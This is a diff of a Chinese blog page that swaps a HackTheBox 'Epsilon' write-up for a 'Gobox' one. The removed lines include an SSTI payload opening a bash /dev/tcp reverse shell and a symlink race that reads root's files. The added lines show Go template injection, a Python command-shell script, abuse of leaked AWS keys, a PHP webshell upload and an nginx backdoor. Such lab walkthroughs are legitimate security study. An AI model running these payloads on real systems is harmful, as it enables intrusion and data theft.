@@ -16,52 +16,47 @@
   <meta name="author" content="Aurey7">
   <meta name="keywords" content="">
   
-    <meta name="description" content="信息收集端口扫描 git泄露 硬编码登录 请求正常，但还是返回index.html，也没有set-Cookie  访问&#x2F;track发现我已经是Admin了  但发什么都是302跳回index&amp;#x20;  commit 泄露AKSK 配置好AKSK后，通过awscli查看可用的lambda函数  获取函数代码  代码本身没什么意义，也不知道哪里可以触发。不过这个secret会不会复用呢？  sec">
+    <meta name="description" content="整体还是挺难的，但我不太喜欢最后的tricks Cloud Tracck算是打完了，最后一台挣扎了一段时间，后面看writeup需要逆向的知识，明天VIP就过期了，没时间研究哩  信息收集端口扫描 4566直接访问会403 80和8080目录爆破无果  GoLang SSTI GetShellhttp:&#x2F;&#x2F;10.10.11.113:8080&#x2F;forgot&#x2F; 尝试SSTI会502 这时候没招了，看了">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Epsilon HackTheBox">
-<meta property="og:url" content="http://aurey7.github.io.git/2023/09/17/Epsilon-HackTheBox/index.html">
+<meta property="og:title" content="Gobox-HackTheBox">
+<meta property="og:url" content="http://aurey7.github.io.git/2023/09/19/Gobox-HackTheBox/index.html">
 <meta property="og:site_name" content="Aurey7&#39;s Blog">
-<meta property="og:description" content="信息收集端口扫描 git泄露 硬编码登录 请求正常，但还是返回index.html，也没有set-Cookie  访问&#x2F;track发现我已经是Admin了  但发什么都是302跳回index&amp;#x20;  commit 泄露AKSK 配置好AKSK后，通过awscli查看可用的lambda函数  获取函数代码  代码本身没什么意义，也不知道哪里可以触发。不过这个secret会不会复用呢？  sec">
+<meta property="og:description" content="整体还是挺难的，但我不太喜欢最后的tricks Cloud Tracck算是打完了，最后一台挣扎了一段时间，后面看writeup需要逆向的知识，明天VIP就过期了，没时间研究哩  信息收集端口扫描 4566直接访问会403 80和8080目录爆破无果  GoLang SSTI GetShellhttp:&#x2F;&#x2F;10.10.11.113:8080&#x2F;forgot&#x2F; 尝试SSTI会502 这时候没招了，看了">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Xg04jRvdp-.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_OkHEk8v4Yz.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8ahnopwPfR.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_c8IeKryvZt.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_lTwPnzFBaY.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_tctk1rWCnL.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_GbtkTnKvxe.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_fZ_PYLG-wC.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MMOLO_7hMF.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Mw1ja9uH_u.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_F654C1Znj2.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_t8UIq7kMRk.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_DJFLL2yqDs.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_j4dP1C-SsI.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_FSifZ3c6Pv.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_R1H0vwZTLq.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_f8hNkU2mua.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_pxB7sGhcUZ.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_zZuTUUWv5W.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_tz0gDdEoET.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_G_Qa8Aciie.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_eExs2JyzMQ.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vMEpavFxw1.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_fBee67KgoB.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MWiHV18Ixf.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_mN1Gx6CYbj.png">
-<meta property="article:published_time" content="2023-09-17T08:49:15.000Z">
-<meta property="article:modified_time" content="2023-09-17T08:51:55.911Z">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_0xQ93xlPKu.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xDdwc3QHf1.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Z58mGZb4qP.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Jg3jU95cY-.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_uVyEAaVezc.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_aGxsWDC77s.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_NeW8TdHd2z.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_NhLjEMR4go.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vuFZzs9Huh.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ch-_L30F_1.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_5OOqbnxcyH.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_G_NcXscFcg.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_d_qS9jLOWI.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_v6Rnw4jFFA.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Vx0xCUvLMw.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-AWDbvfHNg.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_IqX3Kzd0PM.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Z1QdpTH-qt.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_cgznJHjLAf.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_IQyWFfXzMQ.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_923y1bFRx7.png">
+<meta property="article:published_time" content="2023-09-19T14:34:02.000Z">
+<meta property="article:modified_time" content="2023-09-19T14:36:03.494Z">
 <meta property="article:author" content="Aurey7">
 <meta property="article:tag" content="HackTheBox">
 <meta property="article:tag" content="Cloud Native Security">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Xg04jRvdp-.png">
+<meta name="twitter:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_0xQ93xlPKu.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>Epsilon HackTheBox - Aurey7&#39;s Blog</title>
+  <title>Gobox-HackTheBox - Aurey7&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -239,7 +234,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Epsilon HackTheBox"></span>
+            <span id="subtitle" data-typed-text="Gobox-HackTheBox"></span>
           
         </div>
 
@@ -250,8 +245,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-09-17 16:49" pubdate>
-          2023年9月17日 下午
+        <time datetime="2023-09-19 22:34" pubdate>
+          2023年9月19日 晚上
         </time>
       </span>
     
@@ -262,7 +257,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.1k 字
+          1.7k 字
         
       </span>
     
@@ -273,7 +268,7 @@
         
         
         
-          10 分钟
+          15 分钟
         
       </span>
     
@@ -319,67 +314,58 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Epsilon HackTheBox</h1>
+            <h1 style="display: none">Gobox-HackTheBox</h1>
             
             
               <div class="markdown-body">
                 
-                <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Xg04jRvdp-.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h4 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_OkHEk8v4Yz.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h4 id="硬编码登录"><a href="#硬编码登录" class="headerlink" title="硬编码登录"></a>硬编码登录</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8ahnopwPfR.png" srcset="/img/loading.gif" lazyload style="zoom: 50%;" /></p>
-<p>请求正常，但还是返回index.html，也没有set-Cookie</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_c8IeKryvZt.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>访问<code>/track</code>发现我已经是Admin了</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_lTwPnzFBaY.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>但发什么都是302跳回index&#x20;</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_tctk1rWCnL.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h3 id="commit-泄露AKSK"><a href="#commit-泄露AKSK" class="headerlink" title="commit 泄露AKSK"></a>commit 泄露AKSK</h3><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_GbtkTnKvxe.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>配置好AKSK后，通过awscli查看可用的lambda函数</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_fZ_PYLG-wC.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>获取函数代码</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MMOLO_7hMF.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>代码本身没什么意义，也不知道哪里可以触发。不过这个secret会不会复用呢？</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Mw1ja9uH_u.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h3 id="secret复用"><a href="#secret复用" class="headerlink" title="secret复用"></a>secret复用</h3><p>通过泄露的代码和secret生成JWT</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_F654C1Znj2.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>添加到Cookie中，这次访问home没有重定向！</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_t8UIq7kMRk.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>把Cookie写到浏览器缓存里，方便查看</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_DJFLL2yqDs.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h3 id="SSTI-GetShell"><a href="#SSTI-GetShell" class="headerlink" title="SSTI GetShell"></a>SSTI GetShell</h3><p>其实代码审计的时候就发现order这里是存在SSTI，只是当时利用不了。现在可以访问到了</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_j4dP1C-SsI.png" srcset="/img/loading.gif" lazyload style="zoom:50%;" /></p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_FSifZ3c6Pv.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p><strong>POC</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">addr=123&amp;costume=%7B%7B%22%22.__class__.__bases__%5B0%5D.__subclasses__()%5B132%5D.__init__.__globals__%5B<span class="hljs-string">&#x27;popen&#x27;</span>%5D(<span class="hljs-string">&#x27;bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.6%2F7781%200%3E%261%22&#x27;</span>).<span class="hljs-built_in">read</span>()%7D%7D&amp;q=123<br></code></pre></td></tr></table></figure>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_R1H0vwZTLq.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>通过linpeas和进程发现root运行的docker-proxy</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_f8hNkU2mua.png" srcset="/img/loading.gif" lazyload style="zoom:50%;" /></p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_pxB7sGhcUZ.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<blockquote>
-<p>Docker 代理允许主机和容器之间进行网络通信，通过将端口从主机映射到容器内部，来实现对容器中服务的访问</p>
-</blockquote>
-<p>但这似乎不能直接利用，只能上pspy监听一下进程</p>
-<p>发现root一直在运行<code>/usr/bin/backup.sh</code></p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_zZuTUUWv5W.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>这个脚本的问题出在<code>/usr/bin/tar -chvf</code>的h参数上</p>
-<ul>
-<li><code>-h</code>：处理符号链接文件时，将其内容作为文件而不是链接进行处理</li>
-</ul>
-<p>也就是说 <code>ln -s test checksum</code>之后，<code>tar -h</code>会去寻找test文件，而不是checksum。这就造成了利用root任意文件读取的漏洞</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_tz0gDdEoET.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>链接文件并将压缩文件复制到tmp</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_G_Qa8Aciie.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>一番折腾之后发现并不是这个flag</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_eExs2JyzMQ.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>而且<code>/opt/backups/checksum</code>又被删掉了</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vMEpavFxw1.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>写个while语句，当<code>/opt/backups/checksum</code>出现的时候，删掉它。再把root.txt链接过去</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span> <span class="hljs-keyword">if</span> [ -e /opt/backups/checksum ]; <span class="hljs-keyword">then</span> <span class="hljs-built_in">rm</span> -f /opt/backups/checksum; <span class="hljs-built_in">ln</span> -s -f /root/root.txt /opt/backups/checksum; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ln done!&quot;</span>; <span class="hljs-built_in">break</span>; <span class="hljs-keyword">fi</span>; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_fBee67KgoB.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>几次尝试之后成功获取root flag</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MWiHV18Ixf.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>对味，如果想GetShell的话可以读SSH私钥</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_mN1Gx6CYbj.png" srcset="/img/loading.gif" lazyload alt=""></p>
+                <p>整体还是挺难的，但我不太喜欢最后的tricks</p>
+<p>Cloud Tracck算是打完了，最后一台挣扎了一段时间，后面看writeup需要逆向的知识，明天VIP就过期了，没时间研究哩</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_0xQ93xlPKu.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xDdwc3QHf1.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>4566直接访问会403</p>
+<p>80和8080目录爆破无果</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Z58mGZb4qP.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h3 id="GoLang-SSTI-GetShell"><a href="#GoLang-SSTI-GetShell" class="headerlink" title="GoLang SSTI GetShell"></a>GoLang SSTI GetShell</h3><p><a target="_blank" rel="noopener" href="http://10.10.11.113:8080/forgot/" title="http://10.10.11.113:8080/forgot/">http://10.10.11.113:8080/forgot/</a> 尝试SSTI会502</p>
+<p>这时候没招了，看了一下writeup，原来确实是SSTI，只不过是Golang的。又学到了</p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1286">https://forum.butian.net/share/1286</a></p>
+<p>返回模板中的所有内容</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Jg3jU95cY-.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>看起来非常像账号密码，登陆后直接爆出源代码</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_uVyEAaVezc.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>很明显送了个RCE</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">func (u User) DebugCmd (test string) string &#123;<br>  ipp := strings.Split(test, <span class="hljs-string">&quot; &quot;</span>)<br>  <span class="hljs-built_in">bin</span> := strings.Join(ipp[:<span class="hljs-number">1</span>], <span class="hljs-string">&quot; &quot;</span>)<br>  args := strings.Join(ipp[<span class="hljs-number">1</span>:], <span class="hljs-string">&quot; &quot;</span>)<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(args) &gt; <span class="hljs-number">0</span>&#123;<br>    out, _ := <span class="hljs-built_in">exec</span>.Command(<span class="hljs-built_in">bin</span>, args).CombinedOutput()<br>    <span class="hljs-keyword">return</span> string(out)<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    out, _ := <span class="hljs-built_in">exec</span>.Command(<span class="hljs-built_in">bin</span>).CombinedOutput()<br>    <span class="hljs-keyword">return</span> string(out)<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>成功执行命令</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_aGxsWDC77s.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h3 id="自制Shell"><a href="#自制Shell" class="headerlink" title="自制Shell"></a>自制Shell</h3><p>能执行的命令相当有限，反弹Shell一直失败。以为是Glang SSTI的知识盲区，又去看了一下writeup。大伙也反弹不了，通过Python脚本做了个方便执行命令的Shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">from cmd import Cmd<br>import requests<br>import re<br><br>class Term(Cmd):<br>    prompt = <span class="hljs-string">&quot;pythonshell&gt; &quot;</span><br>    pattern = re.compile(r<span class="hljs-string">&#x27;Email Sent To: (.*?)\s+&lt;button class=&quot;btn btn-primary&#x27;</span>, re.DOTALL)<br>    def default(self, args):<br>        cmd = args.replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\\&quot;&#x27;</span>)<br>        res = requests.post(<span class="hljs-string">&#x27;http://10.10.11.113:8080/forgot/&#x27;</span>, data = &#123;<span class="hljs-string">&quot;email&quot;</span>:f<span class="hljs-string">&#x27;&#123;&#123;&#123;&#123; .DebugCmd &quot;&#123;cmd&#125;&quot; &#125;&#125;&#125;&#125;&#x27;</span>&#125;)<br>        try:<br>            res = self.pattern.search(res.text).group(1)<br>            <span class="hljs-built_in">print</span>(res)<br>        except Exception as e:<br>            <span class="hljs-built_in">print</span>(e)<br><br>    def do_exit(self, args):<br>        <span class="hljs-built_in">return</span> True<br><br>term = Term()<br>term.cmdloop()<br></code></pre></td></tr></table></figure>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_NeW8TdHd2z.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>能执行的命令相当有限</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_NhLjEMR4go.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>在<code>/root</code>下发现了aws凭据</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vuFZzs9Huh.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h3 id="容器逃逸"><a href="#容器逃逸" class="headerlink" title="容器逃逸"></a>容器逃逸</h3><p>看到s3里的内容，就是主站的内容。而且是PHP，可以试试上传个Webshell</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ch-_L30F_1.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>写个经典的🐎，再上传上去</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_5OOqbnxcyH.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_G_NcXscFcg.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>Ubuntu用户的user flag被设置成644，导致任何人都可以读</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_d_qS9jLOWI.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h3 id="提权阶段"><a href="#提权阶段" class="headerlink" title="提权阶段"></a>提权阶段</h3><p>4566端口之前访问会直接403，这里存在一个硬编码token</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_v6Rnw4jFFA.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>又留意到下面这个command on；没见过这种配置，感觉是个非正常行为。</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Vx0xCUvLMw.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h4 id="Nginx后门提权"><a href="#Nginx后门提权" class="headerlink" title="Nginx后门提权"></a>Nginx后门提权</h4><p>留意到nginx使用root用户运行</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-AWDbvfHNg.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>modules-enabled 目录下发现 backdoor.conf</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_IqX3Kzd0PM.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>了解了一下真是后门</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Z1QdpTH-qt.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>按照项目信息直接执行没有回复</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_cgznJHjLAf.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>又看了下writeup，strings发现ippsec.run。才能执行命令</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_IQyWFfXzMQ.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_923y1bFRx7.png" srcset="/img/loading.gif" lazyload alt=""></p>
 
                 
               </div>
@@ -406,8 +392,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Epsilon HackTheBox</div>
-      <div>http://aurey7.github.io.git/2023/09/17/Epsilon-HackTheBox/</div>
+      <div>Gobox-HackTheBox</div>
+      <div>http://aurey7.github.io.git/2023/09/19/Gobox-HackTheBox/</div>
     </div>
     <div class="license-meta">
       
@@ -419,7 +405,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年9月17日</div>
+          <div>2023年9月19日</div>
         </div>
       
       
@@ -451,18 +437,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/09/19/Gobox-HackTheBox/" title="Gobox-HackTheBox">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Gobox-HackTheBox</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/09/16/Monteverde-HackTheBox/" title="Monteverde HackTheBox">
-                        <span class="hidden-mobile">Monteverde HackTheBox</span>
+                      <a href="/2023/09/17/Epsilon-HackTheBox/" title="Epsilon HackTheBox">
+                        <span class="hidden-mobile">Epsilon HackTheBox</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
